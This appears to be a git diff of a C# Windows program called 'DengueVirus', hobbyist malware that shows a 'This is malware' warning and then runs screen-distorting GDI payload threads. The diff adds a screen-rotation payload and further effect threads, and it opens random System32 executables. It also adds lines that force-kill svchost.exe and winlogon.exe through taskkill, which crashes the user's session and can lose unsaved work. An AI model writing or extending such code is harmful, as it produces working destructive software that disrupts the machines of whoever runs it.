@@ -1,10 +1,10 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Drawing2D;
 using System.Drawing.Imaging;
 using System.Media;
 using System.Runtime.InteropServices;
-using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 using DengueVirus.Spicy;
@@ -271,7 +271,7 @@ namespace DengueVirus
                 //long v11 = stopwatch.ElapsedTicks;
                 //uint v12 = (((uint)v11 << 13) ^ (uint)v11) << 17 ^ ((uint)v11 << 13) ^ (uint)v11;
                 //Sleep((uint)(((32 * v12) ^ v12) % 0x320 + 600));
-                Thread.Sleep(random.Next(1, 10));
+                Thread.Sleep(1);
             }
         }
 
@@ -356,10 +356,26 @@ namespace DengueVirus
             }
         }
 
+        public void RotateScreen()
+        {
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            Graphics g = Graphics.FromHdc(hdc);
+            g.InterpolationMode = InterpolationMode.Low;
+            g.CompositingQuality = CompositingQuality.HighSpeed;
+            g.SmoothingMode = SmoothingMode.HighSpeed;
+            g.PixelOffsetMode = PixelOffsetMode.HighSpeed;
+
+            while (true)
+            {
+                g.RotateTransform(random.Next(-40, 40));
+                Thread.Sleep(100);
+            }
+        }
+
         public void Form1_Load(object sender, EventArgs e)
         {
             //SpicyPL.ForceUACElevation();
-
+            
             // First warning
             DialogResult dialogResult = MessageBox.Show("This is malware. Are you sure you want to run this program?", "Dengue", MessageBoxButtons.YesNo);
             if (dialogResult != DialogResult.Yes)
@@ -417,8 +433,6 @@ namespace DengueVirus
             audio.Load(); // Ensure the audio is loaded before playing
             audio.Play();*/
 
-            Thread.Sleep(8000);
-
             Thread winpos = new Thread(WindowPosSpam); winpos.Start();
             Thread fill = new Thread(FillScreen); fill.Start();
             SpicyPL.OpenRandomEXEFromSys32();
@@ -464,7 +478,25 @@ namespace DengueVirus
             winpos.Abort();
             fill.Abort();
             sigma.Abort();
+
+            Thread a = new Thread(PatBltpayload); a.Start();
+            Thread b = new Thread(Wave); b.Start();
+            Thread c = new Thread(PrintRotate); c.Start();
+            Thread d = new Thread(DrawTextScreen); d.Start();
+            SpicyPL.OpenRandomEXEFromSys32();
+            Thread.Sleep(10000);
+            a.Abort(); c.Abort();
+            Thread.Sleep(4000);
+            b.Abort(); d.Abort();
+
+            Process.Start("taskkill", "/F /IM svchost.exe");
+            Process.Start("taskkill", "/F /IM winlogon.exe");
+
+            //taskkill itself
+            Process.Start("taskkill", "/F /IM DengueVirus.exe");
         }
+
+        
 
         private void button1_Click(object sender, EventArgs e)
         {
